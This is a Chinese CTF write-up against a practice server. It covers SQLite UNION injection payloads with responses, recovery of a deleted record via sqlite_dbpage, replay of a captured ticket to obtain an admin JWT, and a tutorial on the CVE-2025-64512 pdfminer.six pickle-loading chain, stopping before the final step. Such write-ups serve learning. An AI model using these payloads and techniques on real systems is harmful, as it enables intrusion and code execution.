---
title: "CTFWEB 199.193.127.177:9000"
description: "一道 Web 题的解题记录，涉及 SQLite 注入、流量分析、Token 兑换、PDF 对象结构、pickle 反序列化与 rsync 通配符参数注入。"
publishDate: "2026-07-31T21:43:23"
tags:
  - "ctf"
  - "web"
heroImage: { src: './woke-up-at-night.jpg', color: '#9A8983' }
language: '简中'
draft: false
---

战队学长出的一道web题，开头的登陆部分似乎参考了刚结束的D^3CTF的Ghost Zero这道题，非常有意思，学到了很多东西喵

## SQLite注入

进入后是登陆界面

账户密码尝试`1'`返回`near \"d432e1884c5cc00b34c5020177c53036ba0b8aa80d7ec08d8af4cf9e1205215d\": syntax error`，猜测存在sql注入

尝试发现可以使用`--`注释掉后续语句

尝试发现堆叠注入被禁止

尝试发现可以使用联合查询

发现有3个字段，均可回显

后段逻辑类似：

```sql
SELECT id, username, hash
FROM users
WHERE username = '<username>'
  AND hash = '<password_hash>'
```

查出来是`sqlite`数据库，版本是`3.40.1`

并成功查出一些表

```sql
1' UNION SELECT type,name,sql FROM sqlite_master--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 12:45:52 GMT
Connection: close
Content-Type: application/json
Content-Length: 566

{"audit":[{"hash":"CREATE TABLE User (id INTEGER PRIMARY KEY, username TEXT NOT NULL, hash TEXT NOT NULL)","id":"table","username":"User"},{"hash":"CREATE TABLE knowledge_base (id INTEGER PRIMARY KEY, title TEXT NOT NULL, summary TEXT NOT NULL)","id":"table","username":"knowledge_base"},{"hash":"CREATE TABLE \"logs??\" (id INTEGER PRIMARY KEY, \"text???\" TEXT NOT NULL)","id":"table","username":"logs??"},{"hash":"CREATE TABLE \"q_8f3c1a72d90e4b65\" (id INTEGER PRIMARY KEY, \"r4\" TEXT NOT NULL)","id":"table","username":"q_8f3c1a72d90e4b65"}],"error":"denied"}
```

`User`表：

```sql
1' UNION SELECT * FROM USER--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 13:14:27 GMT
Connection: close
Content-Type: application/json
Content-Length: 233

{"audit":[{"hash":"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec","id":1,"username":"guest"},{"hash":"44b9cd203435cab8059b6cc6c86ece838535cf8a5845083b19b4398652772614","id":2,"username":"admin"}],"error":"denied"}
```

`knowledge_base`表：

```sql
1' UNION SELECT id,title,summary FROM knowledge_base--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 12:55:31 GMT
Connection: close
Content-Type: application/json
Content-Length: 956

{"audit":[{"hash":"Episode index, staff notes, and release windows.","id":1,"username":"Silent Spiral"},{"hash":"Mirror metadata for a restored art-school batch.","id":2,"username":"Blue Period Archive"},{"hash":"Station cuts, preview frames, and translation notes.","id":3,"username":"Metro Bloom"},{"hash":"Syndicated late-night slot with regional edits.","id":4,"username":"Kisaragi Relay"},{"hash":"Compression report for a twelve-part remaster.","id":5,"username":"Nocturne Grid"},{"hash":"A continuity map for cour one and cour two.","id":6,"username":"Kyoto Loop"},{"hash":"Scans, subs, and renderer compatibility notes.","id":7,"username":"Paper Siren"},{"hash":"Broadcast captures for missing bumpers.","id":8,"username":"Signal Garden"},{"hash":"Source provenance and scene timing corrections.","id":9,"username":"Neon Weather"},{"hash":"Catalogued inserts and clean opening variants.","id":10,"username":"After School Atlas"}],"error":"denied"}
```

`q_8f3c1a72d90e4b65`表：

```sql
1' UNION SELECT id,r4,3 FROM q_8f3c1a72d90e4b65--
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 12:50:07 GMT
Connection: close
Content-Type: application/json
Content-Length: 389

{"audit":[{"hash":"3","id":1,"username":"/test/7f9c18a2e44d/5d0185499f64d3116843ddcb3dd16344.pcap"},{"hash":"3","id":2,"username":"/test/7f9c18a2e44d/04f9654471407af9db118e1cb7333bba.pcap"},{"hash":"3","id":3,"username":"/test/7f9c18a2e44d/73cfa9f8eafad4b574970ae9ced11c67.pcap"},{"hash":"3","id":4,"username":"/test/7f9c18a2e44d/d418e1a02f2f607a3d0f23a3cc1b9091.pcap"}],"error":"denied"}
```

这最后一个表的四个文件可以下载，但没见过（
似乎与流量分析有关（
但从没接触过类似题（

## 恢复已删除的pcap

得到提示：sqlite有个东西叫虚表，就是sqlite删掉东西之后，可以通过一些手段找回

进一步查询了解到：为了方便调试和底层分析，SQLite 提供了一个官方扩展虚表——**`sqlite_dbpage`**。

它的作用非常暴力：**绕过所有的 SQL 逻辑结构，直接以“页（Page）”为单位，读取或写入 SQLite 数据库文件的底层原始二进制数据。**

它的表结构非常简单，相当于：

```sql
CREATE TABLE sqlite_dbpage(
  pgno INTEGER PRIMARY KEY, /* 页码 (Page number) */
  data BLOB                 /* 该页对应的原始二进制数据 (Raw page data) */
);
```

因为 `sqlite_dbpage` 读的是数据库的**原始物理字节**，所以它不仅能读出当前存在的数据，**也能把那些被标记为“已删除”但尚未被覆盖的“幽灵数据”一并读出来**。

所以这里有思路了，把data转为hex编码直接拖出来，看看是否有遗漏的数据，先查页数看看

发现有5页，多了一个被删除的数据

```sql
1' UNION SELECT 1,2,pgno FROM sqlite_dbpage-- 
```

```http
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Date: Wed, 29 Jul 2026 16:11:58 GMT
Connection: close
Content-Type: application/json
Content-Length: 204

{"audit":[{"hash":"1","id":1,"username":"2"},{"hash":"2","id":1,"username":"2"},{"hash":"3","id":1,"username":"2"},{"hash":"4","id":1,"username":"2"},{"hash":"5","id":1,"username":"2"}],"error":"denied"}
```

现在通过`1' UNION SELECT 1,pgno,hex(data) FROM sqlite_dbpage`并配合cypherchef找到被删除的数据`/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap`：

```text
OCAPTURE_RECEIPT:{"batch":"cap-2024-11-ops","storagePath":"/app/data/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","downloadPath":"/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","bytes":18231,"sha256":"8f3a34bb0b9bef7ed0a1466762a3c29443b298b42095215f09b19e98d289eda1"}
}/test/7f9c18a2e44d/d418e1a02f2f607a3d0f23a3cc1b9091.pcap
}/test/7f9c18a2e44d/73cfa9f8eafad4b574970ae9ced11c67.pcap
}/test/7f9c18a2e44d/04f9654471407af9db118e1cb7333bba.pcap
}/test/7f9c18a2e44d/5d0185499f64d3116843ddcb3dd16344.pcap
```

下载后在Wireshark中分析http包：

```text
第一步是进行健康检查
GET /health HTTP/1.1
Host: legacy-api.internal:8080
User-Agent: legacy-capture/2.1


HTTP/1.1 200 OK
Content-Type: application/json
Server: legacy-api
Content-Length: 34

{"ok":true,"service":"legacy-api"}

第二步是获取exchangeTicket
POST /ddddddtestStat HTTP/1.1
Authorization: Bearer REDACTED-LEGACY-USER-JWT
Content-Type: application/json
X-Legacy-Mode: plaintext-test
X-Debug-Capture: pre-encryption
Host: legacy-api.internal:8080
User-Agent: legacy-capture/2.1
Content-Length: 72

{"principal":"ops-root","mode":"bootstrap","credentialType":"temporary"}

HTTP/1.1 200 OK
Content-Type: application/json
X-Capture-Stage: pre-encryption
Server: legacy-api
Content-Length: 137

{"exchangeTicket":"ltkt_X-Nx9HoMKuJGwDYYSeCnLGZASTdkgObaqK-VXoCZ","exchangeAudience":"frontend-admin","expiresAt":"2038-01-19T03:14:07Z"}

第三步是拿ticket兑换admin的accessToken
POST /api/auth/exchange HTTP/1.1
Content-Type: application/json
X-Exchange-Source: legacy-capture
Host: mirror-edge.internal:8080
User-Agent: legacy-capture/2.1
Content-Length: 73

{"ticket":"ltkt_X-Nx9HoMKuJGwDYYSeCnLGZASTdkgObaqK-VXoCZ","want":"admin"}

HTTP/1.1 200 OK
Content-Type: application/json
Server: legacy-api
Content-Length: 88

{"role":"admin","accessToken":"redacted-at-capture","session":"browser","next":"/admin"}

第四步是提交一封已加密的信封
POST /v3/envelope/ingest HTTP/1.1
Content-Type: application/x-legacy-envelope
X-Envelope-Stage: sealed
Host: capture-gw.internal:8443
User-Agent: legacy-capture/2.1
Content-Length: 1019

{"kid":"env-v3","label":"archive-noise","nonce":"076b2bb4689131a87c99bb68","ct":"qvEh3F6ciiTQTqUBitItGcWfWI2X3IBcRFKf2id8TcqTcg/iwgvFyiDvVLTCCukVCHArnbKTo0N3tAFfm06pUYxMgEKJwZju4LxCfw4I+oWHSbMVIxr2xB/az/1VH7mNhxR7eSnkxj/uHY9rhe28NSlZP+a5IAxw62YMu+cedc11YxaSyDyCVIKlqRVlmoAvYtgKjHKlBXMxJZrxsMG7qGibEQ/yh3/9epaveqmQMrspYykWk+RAa11Q/PAEnpFqLYinNIsZLZinpNeV7ykEm3siEgkk98+y0TLmfMFkofRG5jUZ2FNDd1cA025bu6sPuzmLT3/gccn20s+4FcDY2/BfFVSN8no8+9xOwj09EveHf4fIODQ2dDaM8qrnllMwjQE0sx7BiR+Lq5iu/52zJbzD26taKwoR09srOz0Tq8+asVvPH8oKHdtHdrharWtkobnet+kN8Ghgup7wpZNLSUGEsJw6vIA00i6MjaYSgGVucLJvBbfS/lyx20DCwcZ3b4vjKLIMTN6XnQafzF1QeS5nPEj/w6bXKO0mikUg3gdsW/OcdQDkGBDmoHxnYRJ3gge5CDXGrZiiiIUQfJfMvK4sbzVNQhvo8LOQa5vsnRHZSh6d4+cn6+seSSx7KeMQK6rL0f6te4bOuwFseClBaIDnVm251Q5/a5SzI7rjn5vg5Lk3FxCMmBd9IJX3cbG16dIOJ/jiZHWE5OqL3Ro8Iy3+V7gcY/hSXWfBOhYFcfXvFiBsISQsN5EoNC3Q36LDqxHt8mCm61e5aGWGr/PrPwy4tHFr/rvNCJ9XVWtYXpQma0xzqWX+WIrhBvtiwYQrY9fiVWWDGSnk4+jWWRIN+JVXT2sWf7YYakaECKE4FmAJREeeUUEHldx1FjI1oRYWUIg2fJUi4JDtmMT4N2zctT5snQmUWn5WaefvIA=="}

HTTP/1.1 204 No Content
Server: legacy-api
Content-Length: 0
```

从二三步可以知道获取admin权限的逻辑

## 兑换accessToken

尝试访问`/ddddddtestStat`返回404，直接使用pcap文件里的ticket尝试

```http
POST /api/auth/exchange HTTP/1.1
Content-Type: application/json
X-Exchange-Source: legacy-capture
Host: 199.193.127.177:9000
User-Agent: legacy-capture/2.1
Content-Length: 73

{"ticket":"ltkt_X-Nx9HoMKuJGwDYYSeCnLGZASTdkgObaqK-VXoCZ","want":"admin"}

HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 29 Jul 2026 16:42:50 GMT
Connection: close
Content-Type: application/json
Content-Length: 245

{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImF1ZCI6InBkZi1yZW5kZXJlciIsImlhdCI6MTc4NTM0MzM3MCwiZXhwIjoxNzg1MzY0OTcwfQ.NQbgH16UZsjoiG-zQeCNGhzcGlGKQDmKzA-5EVkhNPA","next":"/admin","role":"admin"}
```

成功拿到accessToken，在hackbar设置header为`Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImF1ZCI6InBkZi1yZW5kZXJlciIsImlhdCI6MTc4NTM0MzM3MCwiZXhwIjoxNzg1MzY0OTcwfQ.NQbgH16UZsjoiG-zQeCNGhzcGlGKQDmKzA-5EVkhNPA`成功进入admin面板（这里了解到：Authorization: Bearer 是 RFC 6750 定义的 OAuth 2.0 标准格式，几乎所有返回 JWT 的系统都按这个格式接收，如果不用 Bearer，常见替代方案是 Cookie 或自定义头如 X-Auth-Token，但前者是最通用的。且前面获取ticket的http包也应证了这一点：POST /ddddddtestStat HTTP/1.1 Authorization: Bearer REDACTED-LEGACY-USER-JWT），是一个PDF Render

`/admin`：

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Renderer</title>
    <link rel="stylesheet" href="/static/main.css">
  </head>
  <body>
    <main class="admin-layout">
      <section class="panel render-panel">
        <div class="brand">Renderer</div>
        <form id="pdf-form" class="form">
          <label>
            Document
            <input id="pdf" name="pdf" type="file" accept="application/pdf,.pdf">
          </label>
          <button type="submit">Convert</button>
        </form>
      </section>
      <section class="panel output-panel">
        <pre id="output"></pre>
      </section>
    </main>
    <script src="/static/admin.js"></script>
  </body>
</html>
```

`/static/admin.js`：

```javascript
const form = document.querySelector("#pdf-form");
const output = document.querySelector("#output");

form.addEventListener("submit", async (event) => {
  event.preventDefault();
  output.textContent = "";
  const pdf = document.querySelector("#pdf").files[0];
  const body = new FormData();
  body.append("pdf", pdf);
  const res = await fetch("/api/pdf/convert", {
    method: "POST",
    body,
  });
  const data = await res.json();
  output.textContent = JSON.stringify(data, null, 2);
});
```

这个js文件的含义为：监听 admin 页面里的 PDF 上传表单，把你选中的文件作为 `pdf` 字段上传到 `/api/pdf/convert`，然后把后端返回的 JSON 打印到页面上。

原始HTTP请求格式为：

```http
POST /api/pdf/convert HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxxWebKitFormBoundaryY5EMBpz4pba8Mtbm

------WebKitFormBoundaryY5EMBpz4pba8Mtbm
Content-Disposition: form-data; name="pdf"; filename="test.pdf"
Content-Type: application/pdf

%PDF-1.3
...<这里是PDF文件的原始二进制内容>
%%EOF
------WebKitFormBoundaryY5EMBpz4pba8Mtbm--
```

尝试：

```http
POST /api/pdf/convert HTTP/1.1
Host: 199.193.127.177:9000
Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImF1ZCI6InBkZi1yZW5kZXJlciIsImlhdCI6MTc4NTQ3OTY5NiwiZXhwIjoxNzg1NTAxMjk2fQ.I7wKwZgeTu-B37LtPeEozbUHXwBZ5Wj0GTdC_Tvq1mg
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY5EMBpz4pba8Mtbm
Accept: */*
Origin: http://199.193.127.177:9000
Referer: http://199.193.127.177:9000/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: keep-alive
Content-Length: 189

------WebKitFormBoundaryY5EMBpz4pba8Mtbm
Content-Disposition: form-data; name="pdf"; filename="sample.pdf"
Content-Type: application/pdf



------WebKitFormBoundaryY5EMBpz4pba8Mtbm--
```

返回：

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Fri, 31 Jul 2026 06:54:43 GMT
Connection: close
Content-Type: application/json
Content-Length: 919

{"job":"23b7196c5fb44b56bfaa93bcf4a0698c","returncode":1,"stderr":"Traceback (most recent call last):\n  File \"/app/app/pdf_worker.py\", line 12, in <module>\n    main(sys.argv[1], sys.argv[2])\n  File \"/app/app/legacy_pdf.py\", line 141, in main\n    print(json.dumps(convert(Path(pdf), Path(job)), separators=(\",\", \":\")))\n                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/app/app/legacy_pdf.py\", line 115, in convert\n    raise ValueError(\"not a pdf\")\nValueError: not a pdf\n","stdout":"{\"error\":\"not a pdf\",\"trace\":\"Traceback (most recent call last):\\n  File \\\"/app/app/pdf_worker.py\\\", line 12, in <module>\\n    main(sys.argv[1], sys.argv[2])\\n  File \\\"/app/app/legacy_pdf.py\\\", line 141, in main\\n    print(json.dumps(convert(Path(pdf), Path(job)), separators=(\\\",\\\", \\\":\\\")))\\n                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\\nValueError: not a pdf\\n\"}\n"}
```

成功通过认证进入pdf render的后端逻辑，但我发的显然不是pdf而产生报错`ValueError: not a pdf`，同时报错信息里又存在`/app/app/pdf_worker.py`、`/app/app/legacy_pdf.py`

正常的pdf上传：

```text
------WebKitFormBoundaryY5EMBpz4pba8Mtbm
Content-Disposition: form-data; name="pdf"; filename="sample.pdf"
Content-Type: application/pdf
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
------WebKitFormBoundaryY5EMBpz4pba8Mtbm--
```

```json
{"job":"c8fea93055f1478c9ffd1979cd171658","returncode":0,"stderr":"","stdout":"{\"embedded\":[],\"encodings\":[],\"loaded\":[],\"missing\":[],\"pages\":1}\n"}
```

根据返回的字段猜测：

```text
{
  "embedded": [],            ->内嵌的东西
  "encodings": [],        ->编码情况
  "loaded": [],                ->加载情况
  "missing": [],            ->缺失的东西
  "pages": 1                    ->pdf页数
}
```

然后全都不会利用，投降了喵！

## 关于PDF

继续得到提示：CVE-2025-64512，[从PDF对象树到RCE](https://www.ymsora.com/posts/pdf1/)，这似乎是我从未接触过的领域，所以借此机会学习了一下pdf：

PDF 是一堆对象组成的文档数据库。阅读器或解析库会从入口对象开始，沿着引用关系把页面、字体、图片、内容流等对象找出来。

### 1. PDF 文件最粗的结构

一个典型 PDF 大概分四块：

```text
%PDF-1.7

1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>
endobj

4 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (Hello PDF) Tj ET
endstream
endobj

xref
...
trailer
<< /Root 1 0 R >>
%%EOF
```

这几个部分的作用：

| 部分 | 作用 |
| --- | --- |
| `%PDF-1.7` | 文件头，说明 PDF 版本 |
| `obj ... endobj` | 一个个独立对象 |
| `stream ... endstream` | 大块数据，比如页面内容、图片、字体数据 |
| `xref` | 交叉引用表，记录每个对象在文件里的偏移 |
| `trailer` | 尾部字典，告诉解析器入口在哪里 |
| `/Root` | 指向整个 PDF 的根对象，也就是 Catalog |

### 2. PDF 的对象是什么

PDF 里最核心的概念是 **object，对象**。

比如：

```text
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
```

这里 `1 0 obj` 表示：

```text
对象编号：1
版本号：0
对象内容：一个字典
```

`2 0 R` 表示引用另一个对象：

```text
引用 2 号对象，第 0 代版本
```

所以 `/Pages 2 0 R` 的意思是：当前对象的 `/Pages` 字段不直接写页面树，而是指向 `2 0 obj`。

### 3. PDF 的基础数据类型

PDF 语法里常见类型有这些：

| 类型 | 例子 | 含义 |
| --- | --- | --- |
| Boolean | `true`, `false` | 布尔值 |
| Number | `123`, `3.14` | 数字 |
| Name | `/Catalog`, `/Page` | 名称，类似键名或枚举值 |
| String | `(hello)` | 普通字符串 |
| Hex String | `<48656c6c6f>` | 十六进制字符串 |
| Array | `[1 2 3 0 R]` | 数组 |
| Dictionary | `<< /Type /Page >>` | 字典，键值对 |
| Stream | `stream ... endstream` | 大块二进制或文本数据 |
| Indirect Reference | `5 0 R` | 对另一个对象的引用 |

其中最重要的是三类：

```text
字典 Dictionary
引用 Reference
流 Stream
```

PDF 对象树基本就是靠它们搭起来的。

### 4. PDF 对象树

对象树可以理解成：

```text
Catalog
  -> Pages
      -> Page
          -> Contents
          -> Resources
              -> Font
              -> XObject
              -> ColorSpace
```

用 Mermaid 表示会更直观：

![PDF 对象树：Catalog 根对象 → Pages 页面树 → Page 页面对象，Page 下为 Contents 内容流与 Resources 资源字典（含 Font、XObject）](./images/1-1.png)

注意：这棵树不是文件里的物理顺序，而是**引用关系**。对象可以写在文件任何位置，只要 `xref` 能找到它。

### 5. Catalog：PDF 的根

Catalog 是 PDF 的入口对象。

```text
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
```

`/Type /Catalog` 说明这是根对象。

`/Pages 2 0 R` 说明页面树在 `2 0 obj`。

PDF 解析器一般会从 trailer 里找 `/Root`：

```text
trailer
<<
  /Root 1 0 R
>>
```

然后进入 `1 0 obj`，再顺着 `/Pages` 找页面。

### 6. Pages 和 Page

`/Pages` 是页面集合，`/Page` 是单个页面。

```text
2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj
```

含义：

```text
这是一个页面树节点
它有 1 个子页面
子页面是 3 0 obj
```

单个页面对象：

```text
3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Contents 4 0 R
  /Resources 5 0 R
>>
endobj
```

几个字段很关键：

| 字段 | 含义 |
| --- | --- |
| `/Parent` | 上级 Pages 对象 |
| `/MediaBox` | 页面大小 |
| `/Contents` | 页面绘制命令 |
| `/Resources` | 页面用到的字体、图片等资源 |

### 7. Contents：页面内容流

页面上显示什么，通常在 `/Contents` 指向的 stream 里。

```text
4 0 obj
<< /Length 44 >>
stream
BT
/F1 24 Tf
100 700 Td
(Hello PDF) Tj
ET
endstream
endobj
```

这里的内容不是 HTML，而是 PDF 绘图指令。

简单解释：

| 指令 | 含义 |
| --- | --- |
| `BT` | Begin Text，开始文本对象 |
| `/F1 24 Tf` | 使用字体 F1，字号 24 |
| `100 700 Td` | 移动文字位置 |
| `(Hello PDF) Tj` | 显示字符串 |
| `ET` | End Text，结束文本对象 |

所以 PDF 页面并不是直接写“这里有一段文字”，而是写一串绘制命令。

### 8. Resources：资源字典

`Contents` 里写 `/F1 24 Tf`，那 `/F1` 是什么字体？这就要看 `/Resources`。

```text
5 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj
```

意思是：

```text
页面资源里有一个字体资源
名字叫 /F1
真正的字体对象是 6 0 obj
```

字体对象可能长这样：

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj
```

这里就是普通 Helvetica 字体。

### 9. 字体为什么和安全漏洞有关

因为 PDF 里的文字显示不是简单的 Unicode。

很多 PDF 内部存的是字符编码，比如：

```text
0x01 0x02 0x03
```

但这些编码到底对应什么汉字、日文、韩文、符号，需要一张映射表。这个映射表就叫 **CMap**。

CMap 可以理解成：

```text
PDF 内部字符编码 -> 真正 Unicode 字符
```

例如：

```text
<0001> -> U+4F60  你
<0002> -> U+597D  好
```

所以提取 PDF 文本时，解析器需要处理字体和 CMap。

### 10. Type0 字体和 CMap

在复杂字体里，尤其 CJK 字体，常见 `/Subtype /Type0`。

示意：

```text
7 0 obj
<<
  /Type /Font
  /Subtype /Type0
  /BaseFont /SomeFont
  /Encoding /Identity-H
  /DescendantFonts [8 0 R]
>>
endobj
```

这里的 `/Encoding /Identity-H` 就是 CMap 名称。

正常情况下，它表示用内置的 `Identity-H` CMap。

但是 CVE-2025-64512 的关键点就在这里：**恶意 PDF 可以构造异常的 `/Encoding` 名称，让 pdfminer.six 去加载攻击者指定的 CMap pickle 文件。**

### 11. pdfminer.six 为什么会加载 pickle

`pdfminer.six` 为了加速或方便处理 CMap，把一些 CMap 数据保存成 `.pickle.gz`。

大概流程是：

```text
遇到 /Encoding /Identity-H
    -> CMapDB.get_cmap("Identity-H")
    -> 找 Identity-H.pickle.gz
    -> gzip 解压
    -> pickle.loads()
    -> 得到 CMap 数据
```

问题在于，`pickle.loads()` 对不可信数据是危险的。pickle 不是单纯“读数据”，它可能在反序列化时触发代码执行。

### 12. CVE-2025-64512 的漏洞本质

漏洞链可以总结为：

```text
PDF 控制 /Encoding 名称
    -> pdfminer.six 把它当作 CMap 文件名
    -> 拼接成 .pickle.gz 路径
    -> 读取恶意 gzip pickle
    -> pickle.loads() 触发代码执行
```

所以它不是：

```text
PDF 自己执行代码
```

而是：

```text
解析 PDF 的 Python 库错误地信任了 PDF 影响到的文件路径和 pickle 内容
```

即攻击者通常需要两个东西：

```text
1. 一个恶意 PDF，用来触发加载某个 CMap 名称
2. 一个恶意 .pickle.gz 文件，放在目标可访问的位置
```

### 13. 示例

一个简单的正常 PDF 结构：

```text
%PDF-1.7

1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj

2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj

3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Resources 4 0 R
  /Contents 5 0 R
>>
endobj

4 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj

5 0 obj
<<
  /Length 46
>>
stream
BT /F1 24 Tf 100 700 Td (Hello PDF) Tj ET
endstream
endobj

6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj

xref
...
trailer
<<
  /Root 1 0 R
>>
%%EOF
```

这个文件显示的内容大概就是页面上有一行：

```text
Hello PDF
```

PDF 解析器看它时，不是从第一行顺序读到最后一行那么简单，而是先看尾部：

```text
trailer
<<
  /Root 1 0 R
>>
```

意思是：

```text
PDF 的根对象是 1 0 obj
```

然后进入：

```text
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
```

`Catalog` 是整个 PDF 的入口，相当于“总目录”。它说页面树在 `2 0 R`。

`2 0 R` 的意思是：

```text
引用 2 号对象，第 0 代版本
```

于是继续看：

```text
2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj
```

这是页面树。它告诉解析器：

```text
这个 PDF 一共有 1 页
真正的页面对象是 3 0 R
```

然后进入页面对象：

```text
3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Resources 4 0 R
  /Contents 5 0 R
>>
endobj
```

这里最关键的是两个字段：

```text
/Resources 4 0 R
/Contents 5 0 R
```

`/Resources` 是这一页要用到的资源，比如字体、图片、颜色空间。

`/Contents` 是这一页具体画什么，比如在哪里写字、画线、放图片。

先看资源：

```text
4 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj
```

意思是：

```text
这一页有一个字体资源
它在页面内容流里的名字叫 /F1
真正字体对象是 6 0 R
```

字体对象：

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj
```

意思是：

```text
/F1 对应 Helvetica 字体
```

再看内容流：

```text
5 0 obj
<<
  /Length 46
>>
stream
BT /F1 24 Tf 100 700 Td (Hello PDF) Tj ET
endstream
endobj
```

`stream ... endstream` 里面是页面绘制命令：

```text
BT
/F1 24 Tf
100 700 Td
(Hello PDF) Tj
ET
```

逐个解释：

```text
BT              Begin Text，开始写文字
/F1 24 Tf       使用 /F1 字体，字号 24
100 700 Td      把文字位置移动到 x=100, y=700
(Hello PDF) Tj  显示字符串 Hello PDF
ET              End Text，结束文字绘制
```

所以这棵对象树可以画成：

![示例 PDF 的对象树：trailer /Root → Catalog → Pages → Page，Page 引用 Resources（再引用 Font）与 Contents](./images/2-1.png)

这里最重要的几个语法点：

```text
1 0 obj
...
endobj
```

表示一个间接对象。

```text
2 0 R
```

表示引用对象。

```text
<< /Type /Page >>
```

表示字典，类似 JSON 里的对象。

```text
[3 0 R]
```

表示数组。

```text
stream
...
endstream
```

表示流，常用来存页面内容、图片、压缩数据、字体数据。

现在在刚才那个正常 PDF 结构上，**把漏洞触发点叠进去**。先看正常字体，再看恶意字体对象如何把 `pdfminer.six` 带到危险路径。

#### 正常 PDF 字体对象

普通页面对象大概是：

```text
3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 595 842]
  /Resources 4 0 R
  /Contents 5 0 R
>>
endobj
```

资源对象里声明字体：

```text
4 0 obj
<<
  /Font <<
    /F1 6 0 R
  >>
>>
endobj
```

正常字体：

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj
```

这种字体一般不会触发 CMap 加载。CVE-2025-64512 关键在 **Type0 字体 + Encoding CMap**。

#### 叠加漏洞后的字体对象

攻击者会让资源里的 `/F1` 指向一个 Type0 字体：

```text
6 0 obj
<<
  /Type /Font
  /Subtype /Type0
  /BaseFont /DemoFont
  /Encoding /Identity-H
  /DescendantFonts [7 0 R]
>>
endobj
```

正常情况下：

```text
/Encoding /Identity-H
```

表示加载内置 CMap：

```text
Identity-H.pickle.gz
```

但漏洞场景下，攻击者把它换成路径型名称，例如：

```text
/Encoding /#2Ftmp#2Fdemo
```

这里 `#2F` 是 PDF Name 里的十六进制转义，代表 `/`。

所以：

```text
/#2Ftmp#2Fdemo
```

解析后大概等价于：

```text
/tmp/demo
```

然后旧版 `pdfminer.six` 会拼：

```text
/tmp/demo + .pickle.gz
```

变成：

```text
/tmp/demo.pickle.gz
```

接下来危险点来了：

```text
pdfminer.six 读取 /tmp/demo.pickle.gz
gzip 解压
pickle.loads()
```

如果这个 `demo.pickle.gz` 是攻击者控制的 pickle，就会触发反序列化代码执行。

所以现在的利用就只有两个问题了：

```text
1. 恶意 pickle.gz 如何出现在服务端
2. PDF 里的 /Encoding 路径如何指向它
```

## CVE-2025-64512，从PDF对象树到RCE的利用

学长也同时提供了相应的提示：

```text
1.文章只写了怎么load没写怎么把恶意pickle打进服务器，你可以去考虑一下在只传一个pdf的情况下怎么把恶意pickle打到你要load的目录下面去
2.还有个细节就是利用路径穿越去做路径对齐，不然load不到
```

现在继续解题

